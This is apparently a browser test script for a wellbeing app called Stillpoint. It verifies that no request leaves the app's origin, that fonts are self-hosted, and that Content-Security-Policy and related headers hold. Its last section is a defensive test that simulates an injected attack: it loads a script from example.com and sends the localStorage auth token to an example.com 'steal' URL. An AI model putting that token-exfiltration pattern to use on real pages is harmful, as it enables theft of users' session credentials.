import { ACCOUNTS, PASSWORD, WEB, launch } from './browser.mjs';

/**
 * What the app sends, and where.
 *
 * One rule, checked from the outside: **a browser running Stillpoint talks to
 * Stillpoint and to nothing else.** Not as a style preference — this is a
 * product about being upset, and a request to a third party carries the
 * visitor's IP and user-agent with it whatever the response body is. The
 * session screen is the worst place for one and the easiest place to acquire
 * one, because a font, an icon set or an analytics snippet is a single line
 * that nobody reads again.
 *
 * It found something real the first time it ran: the fonts were linked from
 * Google's CDN, so every page load reached them. They are served from
 * `public/fonts` now.
 *
 * The API itself is the one allowed destination besides the app's own origin,
 * and in development both are loopback.
 *
 * It also checks the headers that make that rule the browser's to enforce
 * rather than ours to hope for — and, more usefully, that the policy does not
 * break the app: every console message is watched for a Content-Security-Policy
 * violation, so a header too strict for a screen fails here instead of in front
 * of someone.
 */

const fails = [];
const ok = (l) => console.log(`  ok   ${l}`);
const bad = (l, d) => {
  fails.push(l);
  console.log(`  FAIL ${l}${d ? ` — ${d}` : ''}`);
};

/** Loopback under any spelling, which is the app and the API locally. */
function ours(url) {
  const { hostname } = new URL(url);
  return hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '::1';
}

const browser = await launch();
const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });

/**
 * Every CSP violation the browser reports, from any screen this script visits.
 *
 * A policy nobody checks is a policy that silently stops a stylesheet loading.
 * Chromium logs each refusal to the console, so this is where a too-strict
 * header shows up.
 */
const violations = [];
page.on('console', (message) => {
  const text = message.text();
  if (/Content Security Policy|Refused to (load|execute|connect|apply)/i.test(text)) {
    violations.push(text);
  }
});

const elsewhere = new Map();
page.on('request', (request) => {
  const url = request.url();
  // `data:` and `blob:` never leave the page.
  if (url.startsWith('data:') || url.startsWith('blob:')) return;
  if (ours(url)) return;

  const origin = new URL(url).origin;
  elsewhere.set(origin, (elsewhere.get(origin) ?? 0) + 1);
});

// ---------------------------------------------------------------------------
console.log('\n1. Signed out');

for (const route of ['/welcome', '/welcome/consent', '/welcome/forgot']) {
  await page.goto(`${WEB}${route}`, { waitUntil: 'networkidle' });
}
ok('the public screens loaded');

// ---------------------------------------------------------------------------
console.log('\n2. Signed in, including a session');

await page.goto(`${WEB}/welcome`, { waitUntil: 'networkidle' });
await page.locator('input[type=email]').fill(ACCOUNTS.user);
await page.locator('input[type=password]').fill(PASSWORD);
await page.getByRole('button', { name: 'Sign in' }).click();
await page.waitForTimeout(2500);

for (const route of ['/app', '/app/journal', '/app/insights', '/app/settings', '/session']) {
  await page.goto(`${WEB}${route}`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(700);
}
ok('the app screens loaded');

// ---------------------------------------------------------------------------
console.log('\n3. Where the browser went');

if (elsewhere.size === 0) {
  ok('nothing left this origin');
} else {
  for (const [origin, count] of elsewhere) {
    bad(`a request left for ${origin}`, `${String(count)} of them`);
  }
}

// The fonts are the thing that was wrong, so they are checked by name as well
// as by the rule above — a regression here would most likely arrive as a
// `next/font/google` import that looks entirely reasonable in a diff.
const html = await page.goto(`${WEB}/welcome`).then((r) => r?.text());
if (html !== undefined && /fonts\.(googleapis|gstatic)\.com/.test(html)) {
  bad('the document still links Google Fonts');
} else {
  ok('the document links no webfont CDN');
}

// ---------------------------------------------------------------------------
console.log("\n4. The headers that make it the browser's rule, not ours");

const response = await page.goto(`${WEB}/welcome`, { waitUntil: 'networkidle' });
const headers = response?.headers() ?? {};

const csp = headers['content-security-policy'];
if (typeof csp === 'string' && csp.includes("default-src 'self'")) {
  ok('a Content-Security-Policy is served');
} else {
  bad('a Content-Security-Policy is served', String(csp));
}

// The directive that decides whether a stolen token can be sent anywhere. A
// wildcard here would make the rest of the policy decorative.
const connect = /connect-src ([^;]*)/.exec(csp ?? '')?.[1]?.trim() ?? '';
const destinations = connect.split(/\s+/).filter(Boolean);
if (destinations.length > 0 && destinations.every((d) => d === "'self'" || ours(d))) {
  ok(`connect-src allows only this app and its API (${connect})`);
} else {
  bad('connect-src allows only this app and its API', connect);
}

for (const [header, expected] of [
  ['x-content-type-options', 'nosniff'],
  ['x-frame-options', 'DENY'],
  ['referrer-policy', 'no-referrer'],
]) {
  if (headers[header] === expected) ok(`${header}: ${expected}`);
  else bad(`${header}: ${expected}`, String(headers[header]));
}

// The microphone is off because `UserEar` is unbound and every session is
// typed. If a listener is ever bound this has to change, and it should be a
// deliberate change rather than one nobody noticed.
if (/microphone=\(\)/.test(headers['permissions-policy'] ?? '')) {
  ok('the microphone is denied, as the unbound listener implies');
} else {
  bad('the microphone is denied', String(headers['permissions-policy']));
}

if (violations.length === 0) {
  ok('no screen tripped the policy');
} else {
  for (const v of violations.slice(0, 5)) bad('a screen tripped the policy', v);
}

// ---------------------------------------------------------------------------
console.log('\n5. The policy against the attack it is for');

// The token lives in `localStorage`, which any script on the page can read —
// `apps/web/src/lib/api.ts` says so at the top. The policy does not change
// that; what it takes away is the second half, which is getting the token out.
// So this does what an injected payload would do, from inside the real page,
// and asserts the browser refuses both halves.
//
// It runs last because it deliberately trips the policy, which the section
// above asserts nothing else does.
const before = violations.length;
const exfiltrated = await page.evaluate(async () => {
  const script = document.createElement('script');
  script.src = 'https://example.com/payload.js';
  document.head.appendChild(script);

  try {
    await fetch(
      `https://example.com/steal?t=${String(window.localStorage.getItem('stillpoint.token.v1'))}`,
    );
    return true;
  } catch {
    return false;
  }
});
await page.waitForTimeout(1200);
const refusals = violations.slice(before).join(' | ');

if (!exfiltrated && /Refused to connect/i.test(refusals)) {
  ok('the token cannot be sent to another origin');
} else {
  bad('the token cannot be sent to another origin', refusals || 'the fetch succeeded');
}

if (/Refused to load the script/i.test(refusals)) {
  ok('a script from another origin does not load');
} else {
  bad('a script from another origin does not load', refusals);
}

const faces = await page.evaluate(() =>
  [...document.fonts].map((f) => ({ family: f.family, status: f.status })),
);
const loaded = faces.filter((f) => f.status === 'loaded').map((f) => f.family);
if (loaded.includes('Newsreader') && loaded.includes('Hanken Grotesk')) {
  ok('both families actually loaded, from here');
} else {
  bad('the self-hosted fonts did not load', JSON.stringify(faces));
}

await browser.close();

console.log(
  fails.length === 0 ? '\nALL PASSED' : `\n${String(fails.length)} FAILED: ${fails.join(', ')}`,
);
process.exit(fails.length === 0 ? 0 : 1);
